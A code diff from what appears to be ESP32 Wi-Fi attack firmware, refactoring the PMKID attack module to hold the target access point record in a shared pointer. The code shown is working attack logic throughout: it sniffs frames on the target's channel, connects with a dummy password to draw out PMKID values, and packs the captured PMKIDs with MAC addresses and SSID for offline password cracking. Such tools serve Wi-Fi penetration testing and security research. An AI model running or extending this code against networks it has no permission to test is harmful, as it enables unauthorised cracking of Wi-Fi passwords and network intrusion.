@@ -22,7 +22,7 @@
 #include "wifi_controller.h"
 
 static const char *TAG = "main:attack_pmkid";
-static const wifi_ap_record_t *ap_record{nullptr};
+static std::shared_ptr<const wifi_ap_record_t> gApRecord;
 
 /**
  * @brief Callback for DATA_FRAME_EVENT_PMKID event.
@@ -49,15 +49,15 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
   }
 
   // MAC_STA + MAC_AP + SSID size + SSID + PMKID * count
-  char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *)ap_record->ssid) + (pmkid_item_count * 16));
+  char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *)gApRecord->ssid) + (pmkid_item_count * 16));
   wifictl_get_sta_mac((uint8_t *)content);
   content += 6;
-  memcpy(content, ap_record->bssid, 6);
+  memcpy(content, gApRecord->bssid, 6);
   content += 6;
-  content[0] = strlen((char *)ap_record->ssid);
+  content[0] = strlen((char *)gApRecord->ssid);
   content += 1;
-  strcpy(content, (char *)ap_record->ssid);
-  content += strlen((char *)ap_record->ssid);
+  strcpy(content, (char *)gApRecord->ssid);
+  content += strlen((char *)gApRecord->ssid);
 
   // copy PMKIDs into continuous memory into "content" in status
   pmkid_item = pmkid_item_head;
@@ -74,16 +74,17 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
 
 void attack_pmkid_start(attack_config_t attack_config) {
   ESP_LOGI(TAG, "Starting PMKID attack...");
-  ap_record = attack_config.ap_records[0];
+  gApRecord = std::move(attack_config.ap_records[0]);
   wifictl_sniffer_filter_frame_types(true, false, false);
-  wifictl_sniffer_start(ap_record->primary);
-  frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
-  wifictl_sta_connect_to_ap(ap_record, "dummypassword");
+  wifictl_sniffer_start(gApRecord->primary);
+  frame_analyzer_capture_start(SEARCH_PMKID, gApRecord->bssid);
+  wifictl_sta_connect_to_ap(gApRecord.get(), "dummypassword");
   ESP_ERROR_CHECK(
       esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL));
 }
 
 void attack_pmkid_stop() {
+  gApRecord.reset();
   wifictl_sta_disconnect();
   wifictl_sniffer_stop();
   frame_analyzer_capture_stop();
